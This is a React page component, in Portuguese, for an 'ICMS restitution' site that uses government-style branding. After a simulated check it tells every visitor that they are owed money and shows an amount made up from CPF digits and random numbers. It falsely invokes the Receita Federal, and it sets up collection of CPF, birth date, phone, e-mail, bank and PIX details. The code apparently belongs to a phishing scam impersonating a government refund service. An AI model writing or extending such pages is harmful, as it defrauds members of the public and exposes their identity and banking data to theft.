import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Progress } from "@/components/ui/progress";
import { CheckCircle, Download, AlertTriangle, AlertCircle, CalendarClock, ChevronRight, Phone, Mail, BanknoteIcon, CreditCard, ChevronLeft, CircleDollarSign, Pencil, Check } from "lucide-react";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { useUserData } from "../contexts/UserContext";

// Schemas para validação
const contatoSchema = z.object({
  email: z.string().email("E-mail inválido").min(1, "E-mail é obrigatório"),
  telefone: z.string()
    .min(10, "Telefone deve ter pelo menos 10 dígitos")
    .max(17, "Telefone inválido")
    .regex(/[\d\s\(\)\-]+/, "Formato inválido de telefone"),
});

const dadosBancariosSchema = z.object({
  banco: z.string().min(1, "Selecione um banco"),
  chavePix: z.string()
    .min(11, "CPF deve ter 11 dígitos")
    .max(11, "CPF deve ter 11 dígitos")
    .regex(/^\d+$/, "CPF deve conter apenas números"),
});

const companhiaSchema = z.object({
  companhia: z.string().min(1, "Selecione uma companhia elétrica"),
});

// Lista de companhias elétricas por estado
const companhiasEletricas: Record<string, string[]> = {
  "São Paulo": [
    "ENEL SP",
    "CPFL Paulista",
    "CPFL Piratininga",
    "EDP São Paulo",
    "Elektro"
  ],
  "Rio de Janeiro": [
    "ENEL RJ",
    "Light"
  ],
  "Minas Gerais": [
    "CEMIG Distribuição"
  ],
  "Espírito Santo": [
    "EDP Espírito Santo"
  ],
  "Bahia": [
    "COELBA"
  ],
  "Ceará": [
    "ENEL CE"
  ],
  "Pernambuco": [
    "NEOENERGIA Pernambuco"
  ],
  "Goiás": [
    "ENEL GO"
  ],
  "Mato Grosso": [
    "Energisa Mato Grosso"
  ],
  "Mato Grosso do Sul": [
    "Energisa Mato Grosso do Sul"
  ],
  "Rio Grande do Sul": [
    "RGE Sul",
    "CEEE"
  ],
  "Santa Catarina": [
    "CELESC"
  ],
  "Paraná": [
    "COPEL"
  ],
  "Pará": [
    "Equatorial Pará"
  ],
  "Amazonas": [
    "Amazonas Energia"
  ]
};

// Lista de bancos brasileiros para o select
const bancosBrasileiros = [
  { id: "bb", nome: "Banco do Brasil" },
  { id: "caixa", nome: "Caixa Econômica Federal" },
  { id: "itau", nome: "Itaú Unibanco" },
  { id: "bradesco", nome: "Bradesco" },
  { id: "santander", nome: "Santander" },
  { id: "nubank", nome: "Nubank" },
  { id: "inter", nome: "Banco Inter" },
  { id: "c6", nome: "C6 Bank" },
  { id: "banrisul", nome: "Banrisul" },
  { id: "safra", nome: "Safra" },
  { id: "original", nome: "Banco Original" },
  { id: "bndes", nome: "BNDES" },
  { id: "sicoob", nome: "Sicoob" },
  { id: "sicredi", nome: "Sicredi" },
  { id: "other", nome: "Outro" },
];

type ContatoFormValues = z.infer<typeof contatoSchema>;
type DadosBancariosFormValues = z.infer<typeof dadosBancariosSchema>;
type CompanhiaFormValues = z.infer<typeof companhiaSchema>;

export default function Resultado() {
  const [location, navigate] = useLocation();
  const { userData, updateUserData } = useUserData();
  
  const [isLoading, setIsLoading] = useState(true);
  const [progresso, setProgresso] = useState(0);
  
  // Dados do usuário do contexto
  const cpf = userData.cpf || "";
  const nome = userData.nome || "";
  
  // Dados extras
  const [estado, setEstado] = useState(userData.estado || "Minas Gerais");
  const [companhia, setCompanhia] = useState(userData.companhia || "CEMIG Distribuição");
  const [dataNascimento, setDataNascimento] = useState(userData.dataNascimento || "");
  
  // Dados calculados da restituição
  const [valorTotal, setValorTotal] = useState(0);
  const [mesesAvaliados, setMesesAvaliados] = useState(0);
  const [dataPagamento, setDataPagamento] = useState("");
  
  // Estados para o fluxo de confirmação
  const [etapaConfirmacao, setEtapaConfirmacao] = useState<"inicial" | "contato" | "bancarios" | "confirmacao">("inicial");
  const [animacaoAtiva, setAnimacaoAtiva] = useState(false);
  
  // Dados de contato e bancários
  const [telefoneConfirmado, setTelefoneConfirmado] = useState("");
  const [emailConfirmado, setEmailConfirmado] = useState("");
  const [bancoSelecionado, setBancoSelecionado] = useState("");
  const [chavePix, setChavePix] = useState("");

  // Estado para edição de companhia elétrica
  const [editandoCompanhia, setEditandoCompanhia] = useState(false);
  const [companhiasDisponiveis, setCompanhiasDisponiveis] = useState<string[]>([]);
  
  // Inicializar toast
  const { toast } = useToast();
  
  // Formulário de companhia elétrica
  const companhiaForm = useForm<CompanhiaFormValues>({
    resolver: zodResolver(companhiaSchema),
    defaultValues: {
      companhia: companhia,
    },
  });

  // Função para formatar CPF
  const formatarCPF = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };
  
  // Função para formatar data de nascimento (DD/MM/AAAA)
  const formatarDataNascimento = (data: string) => {
    // Se a data for apenas um ano (YYYY), converte para 01/01/YYYY
    if (/^\d{4}$/.test(data)) {
      return `01/01/${data}`;
    }
    
    // Se for uma data ISO (YYYY-MM-DD), converte para DD/MM/YYYY
    if (/^\d{4}-\d{2}-\d{2}/.test(data)) {
      const partes = data.split('T')[0].split('-');
      return `${partes[2]}/${partes[1]}/${partes[0]}`;
    }
    
    // Se já estiver no formato DD/MM/YYYY, retorna como está
    if (/^\d{2}\/\d{2}\/\d{4}$/.test(data)) {
      return data;
    }
    
    // Se for uma data com formato desconhecido, tenta converter
    try {
      const dataObj = new Date(data);
      if (!isNaN(dataObj.getTime())) {
        return `${String(dataObj.getDate()).padStart(2, '0')}/${String(dataObj.getMonth() + 1).padStart(2, '0')}/${dataObj.getFullYear()}`;
      }
    } catch (e) {
      console.error("Erro ao formatar data:", e);
    }
    
    // Se não conseguir formatar, retorna a data original
    return data;
  };
  
  // Função para formatar valor em reais
  const formatarValor = (valor: number) => {
    return valor.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  };
  
  // Definir data de nascimento do usuário a partir dos dados do contexto
  useEffect(() => {
    if (userData.dataNascimento) {
      // A data já vem formatada no contexto, apenas usar diretamente
      setDataNascimento(userData.dataNascimento);
    } else {
      // Se não tiver data de nascimento no contexto, usar uma padrão
      setDataNascimento("01/01/1990");
    }
  }, [userData.dataNascimento]);
  
  // Detectar estado e companhia baseado no IP do usuário apenas se não tiverem vindo no contexto
  useEffect(() => {
    // Se já temos os dados no contexto, não precisamos detectar
    if (userData.estado && userData.companhia) {
      return;
    }
    
    const detectarLocalizacao = async () => {
      try {
        // Em um cenário real, usaríamos um serviço de geolocalização por IP
        // Para simplificar, usamos valores padrão
        if (!userData.estado) {
          setEstado("Minas Gerais");
          // Atualizar o contexto
          updateUserData({
            estado: "Minas Gerais"
          });
        }
        
        if (!userData.companhia) {
          setCompanhia("CEMIG Distribuição");
          // Atualizar o contexto
          updateUserData({
            companhia: "CEMIG Distribuição"
          });
        }
        
        // Simulação de chamada bem-sucedida
        console.log("Estado detectado pelo IP:", estado);
      } catch (error) {
        console.error("Erro ao detectar localização:", error);
        // Manter os valores padrão em caso de erro
      }
    };
    
    detectarLocalizacao();
  }, [userData.estado, userData.companhia, updateUserData]);

  // Atualizar companhias disponíveis quando o estado mudar
  useEffect(() => {
    // Verificar se o estado existe nas companhias elétricas
    const estadoExiste = Object.keys(companhiasEletricas).includes(estado);
    
    if (estadoExiste) {
      const companhiasDoEstado = companhiasEletricas[estado as keyof typeof companhiasEletricas];
      setCompanhiasDisponiveis(companhiasDoEstado);
      
      // Se a companhia atual não está na lista do estado selecionado, usar a primeira
      if (!companhiasDoEstado.includes(companhia)) {
        setCompanhia(companhiasDoEstado[0]);
        companhiaForm.setValue("companhia", companhiasDoEstado[0]);
      }
    } else {
      // Estado não encontrado, usar lista padrão
      setCompanhiasDisponiveis(["CEMIG Distribuição"]);
    }
  }, [estado, companhia, companhiaForm]);
  
  // Simulação inicial de cálculo da restituição
  useEffect(() => {
    // Verificar se temos CPF e nome
    console.log("Verificando dados do usuário no contexto:", { 
      cpf, 
      nome, 
      dataNascimento: userData.dataNascimento,
      estado: userData.estado,
      companhia: userData.companhia 
    });
    
    if (!cpf || !nome) {
      console.log("CPF ou nome não encontrados, redirecionando para /verificar");
      navigate("/verificar");
      return;
    }
    
    // Simulação de carregamento
    const timer = setInterval(() => {
      setProgresso(oldProgress => {
        if (oldProgress >= 100) {
          clearInterval(timer);
          return 100;
        }
        return oldProgress + 10;
      });
    }, 600);
    
    // Simulação de cálculo concluído
    setTimeout(() => {
      // Gerando valores aleatórios para demonstração
      const baseValue = (parseInt(cpf.slice(-4)) % 30) * 100 + 1500; // Valor entre R$ 1.500 e R$ 4.500
      const meses = Math.floor(Math.random() * 36) + 24; // Entre 24 e 60 meses (2 a 5 anos)
      
      // Calcular data de pagamento (entre 30 e 90 dias no futuro)
      const diasParaPagamento = Math.floor(Math.random() * 60) + 30;
      const dataPgto = new Date();
      dataPgto.setDate(dataPgto.getDate() + diasParaPagamento);
      
      setValorTotal(baseValue);
      setMesesAvaliados(meses);
      setDataPagamento(dataPgto.toLocaleDateString('pt-BR'));
      setIsLoading(false);
      
      clearInterval(timer);
      setProgresso(100);
    }, 3000); // Reduzido para 3 segundos para melhor experiência do usuário
    
    return () => clearInterval(timer);
  }, [cpf, nome, navigate, userData]);
  
  // Função para gerar o PDF de comprovante
  const gerarComprovante = () => {
    alert("Seu comprovante será enviado para o e-mail cadastrado junto à Receita Federal.");
  };
  
  // Formulário de contato
  const contatoForm = useForm<ContatoFormValues>({
    resolver: zodResolver(contatoSchema),
    defaultValues: {
      email: "",
      telefone: "",
    },
  });

  // Formulário de dados bancários
  const dadosBancariosForm = useForm<DadosBancariosFormValues>({
    resolver: zodResolver(dadosBancariosSchema),
    defaultValues: {
      banco: "",
      chavePix: "",
    },
  });
  
  // Formatar telefone para visualização
  const formatarTelefone = (telefone: string) => {
    if (!telefone) return "";
    
    // (XX) XXXXX-XXXX
    if (telefone.length === 11) {
      return `(${telefone.substring(0, 2)}) ${telefone.substring(
        2,
        7
      )}-${telefone.substring(7)}`;
    }
    
    return telefone;
  };
  
  // Enviar dados de contato e ir para próxima etapa
  const onSubmitContato = async (data: ContatoFormValues) => {
    try {
      // Animação de transição
      setAnimacaoAtiva(true);
      
      // Atualizar estado
      setTelefoneConfirmado(data.telefone);
      setEmailConfirmado(data.email);
      
      // Ir para próxima etapa com atraso para animação
      setTimeout(() => {
        setEtapaConfirmacao("bancarios");
        setAnimacaoAtiva(false);
      }, 300);
      
      // Mostrar toast
      toast({
        title: "Dados salvos com sucesso!",
        description: "Agora vamos para os dados bancários.",
      });
    } catch (error) {
      setAnimacaoAtiva(false);
      toast({
        variant: "destructive",
        title: "Erro ao salvar dados",
        description: "Não foi possível salvar seus dados. Tente novamente.",
      });
    }
  };
  
  // Submeter dados bancários
  const onSubmitDadosBancarios = (data: DadosBancariosFormValues) => {
    // Animação de transição
    setAnimacaoAtiva(true);
    
    setBancoSelecionado(
      bancosBrasileiros.find((banco) => banco.id === data.banco)?.nome || ""
    );
    setChavePix(data.chavePix);
    
    setTimeout(() => {
      setEtapaConfirmacao("confirmacao");
      setAnimacaoAtiva(false);
    }, 300);
  };

  // Submeter dados da companhia elétrica
  const onSubmitCompanhia = (data: CompanhiaFormValues) => {
    setCompanhia(data.companhia);
    setEditandoCompanhia(false);
    
    toast({
      title: "Companhia elétrica atualizada",
      description: "Suas informações foram atualizadas com sucesso.",
    });
  };
  
  // Prosseguir para o simulador
  const prosseguirParaSimulador = () => {
    // Atualizar os dados no contexto antes de navegar
    updateUserData({
      cpf,
      nome,
      dataNascimento,
      estado,
      companhia,
      valorRestituicao: valorTotal
    });
    
    console.log("Redirecionando para página de cálculo com dados:", {
      cpf,
      nome,
      dataNascimento,
      estado,
      companhia,
      valorRestituicao: valorTotal
    });
    
    // Navegar para página de cálculo sem parâmetros na URL
    navigate('/calculo');
  };
  
  return (
    <div className="flex flex-col min-h-screen">
      <Header />
      <main className="flex-1 bg-[var(--gov-gray-light)] py-12">
        <div className="container mx-auto px-4">
          <div className="max-w-4xl mx-auto">
            <Card className="shadow-lg overflow-hidden">
              <CardHeader className="bg-[var(--gov-blue)] text-white text-center py-8">
                <CardTitle className="text-2xl font-bold">Restituição de ICMS</CardTitle>
                <CardDescription className="text-gray-100 mt-2">
                  Consulte seus direitos e simule o valor da sua restituição
                </CardDescription>
              </CardHeader>
              
              <CardContent className="p-6">
                {isLoading ? (
                  <div className="text-center py-8">
                    <h3 className="text-lg font-semibold mb-4 text-[var(--gov-blue-dark)]">
                      Verificando seus dados...
                    </h3>
                    <Progress value={progresso} className="h-2 mb-4" />
                    <p className="text-sm text-[var(--gov-gray-dark)]">
                      Estamos consultando suas informações para verificar o direito à restituição.
                    </p>
                  </div>
                ) : (
                  <>
                    <div className="bg-green-50 border border-green-200 rounded-lg p-4 mb-8 flex items-start">
                      <CheckCircle className="text-green-500 mr-3 mt-1 h-5 w-5 flex-shrink-0" />
                      <div>
                        <h3 className="font-semibold text-green-800">Verificação Concluída!</h3>
                        <p className="text-sm text-green-700">
                          Boa notícia! Seus dados foram verificados e você tem direito a recuperar valores de ICMS pagos indevidamente na sua conta de energia elétrica nos últimos 5 anos.
                        </p>
                      </div>
                    </div>
                    
                    <div className="space-y-6">
                      {/* Dados do Solicitante */}
                      <div className="border-b pb-4">
                        <h3 className="text-lg font-semibold mb-3 text-[var(--gov-blue-dark)]">
                          Dados do Solicitante
                        </h3>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                          <div>
                            <p className="text-sm text-[var(--gov-gray-dark)]">Nome Completo:</p>
                            <p className="font-medium">{nome}</p>
                          </div>
                          <div>
                            <p className="text-sm text-[var(--gov-gray-dark)]">CPF:</p>
                            <p className="font-medium">{formatarCPF(cpf)}</p>
                          </div>
                          <div>
                            <p className="text-sm text-[var(--gov-gray-dark)]">Data de Nascimento:</p>
                            <p className="font-medium">{formatarDataNascimento(dataNascimento)}</p>
                          </div>
                          <div>
                            <p className="text-sm text-[var(--gov-gray-dark)]">Estado:</p>
                            <p className="font-medium">{estado}</p>
                          </div>
                          <div className="md:col-span-2">
                            <div className="flex items-center justify-between">
                              <div>
                                <p className="text-sm text-[var(--gov-gray-dark)]">Companhia Elétrica:</p>
                                <div>
                                  <p className="font-medium">{companhia}</p>
                                </div>
                                {false && (
                                  <Form {...companhiaForm}>
                                    <form onSubmit={companhiaForm.handleSubmit(onSubmitCompanhia)} className="space-y-2">
                                      <div className="flex items-center space-x-2">
                                        <FormField
                                          control={companhiaForm.control}
                                          name="companhia"
                                          render={({ field }) => (
                                            <FormItem className="flex-1">
                                              <Select 
                                                onValueChange={field.onChange} 
                                                defaultValue={field.value}
                                              >
                                                <FormControl>
                                                  <SelectTrigger className="w-full">
                                                    <SelectValue placeholder="Selecione sua companhia elétrica" />
                                                  </SelectTrigger>
                                                </FormControl>
                                                <SelectContent>
                                                  {companhiasDisponiveis.map((comp) => (
                                                    <SelectItem key={comp} value={comp}>
                                                      {comp}
                                                    </SelectItem>
                                                  ))}
                                                </SelectContent>
                                              </Select>
                                              <FormMessage />
                                            </FormItem>
                                          )}
                                        />
                                        <Button 
                                          type="submit" 
                                          size="sm" 
                                          className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue-dark)]"
                                        >
                                          <Check className="h-4 w-4" />
                                        </Button>
                                        <Button 
                                          type="button" 
                                          variant="outline" 
                                          size="sm"
                                          onClick={() => setEditandoCompanhia(false)}
                                        >
                                          Cancelar
                                        </Button>
                                      </div>
                                    </form>
                                  </Form>
                                )}
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      
                      {/* Instruções para calcular a restituição */}
                      <div className="border-b pb-4">
                        <h3 className="text-lg font-semibold mb-3 text-[var(--gov-blue-dark)]">
                          Calcule sua Restituição
                        </h3>
                        <div className="bg-[var(--gov-blue)] p-4 rounded-lg border border-[var(--gov-blue)]">
                          <div className="space-y-4">
                            <div className="flex items-start">
                              <CircleDollarSign className="h-6 w-6 mt-0.5 mr-2 text-white" />
                              <div>
                                <p className="font-medium text-white">Saiba quanto você tem a receber!</p>
                                <p className="text-sm text-white">
                                  Na próxima etapa, você poderá calcular o valor da sua restituição do ICMS com base nas suas contas de energia elétrica dos últimos 5 anos.
                                </p>
                              </div>
                            </div>
                            <div className="flex items-start">
                              <AlertCircle className="h-6 w-6 mt-0.5 mr-2 text-white" />
                              <div>
                                <p className="font-medium text-white">O que você vai precisar:</p>
                                <ul className="text-sm text-white ml-4 list-disc">
                                  <li>Valor médio da sua conta de luz</li>
                                  <li>Período aproximado em que você utiliza esta companhia elétrica</li>
                                </ul>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                      
                      {/* Ações disponíveis */}
                      <div className="mt-6">
                        <Button 
                          className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold flex items-center justify-center w-full py-3"
                          onClick={prosseguirParaSimulador}
                        >
                          Calcular Restituição
                          <ChevronRight className="ml-2 h-5 w-5" />
                        </Button>
                      </div>
                      
                      {/* Informações Adicionais */}
                      <div className="mt-8 bg-[var(--gov-gray-light)] p-4 rounded-md border border-[var(--gov-gray)]">
                        <h3 className="text-[var(--gov-blue-dark)] font-semibold mb-2">Informações Importantes:</h3>
                        <ul className="text-sm text-[var(--gov-gray-dark)] space-y-2">
                          <li>• O valor estimado pode variar conforme o consumo dos últimos 5 anos.</li>
                          <li>• Para seguir com o processo, é necessário confirmar seus dados no simulador.</li>
                          <li>• A previsão de pagamento pode ser alterada conforme o volume de solicitações.</li>
                          <li>• Você receberá atualizações sobre o andamento do seu processo.</li>
                        </ul>
                      </div>
                    </div>
                  </>
                )}
              </CardContent>
            </Card>
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
}